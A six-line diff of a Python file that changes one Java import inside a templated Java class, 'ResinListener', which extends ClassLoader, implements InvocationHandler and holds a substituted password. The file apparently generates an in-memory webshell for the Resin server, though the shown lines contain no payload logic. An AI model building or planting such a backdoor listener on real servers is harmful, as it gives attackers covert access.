@@ -1,6 +1,6 @@
 code = """
 import java.lang.reflect.*;
-import java.util.ArrayList;
+import java.util.*;
 
 public class ResinListener extends ClassLoader implements InvocationHandler {{
     private static String password = "{password}";
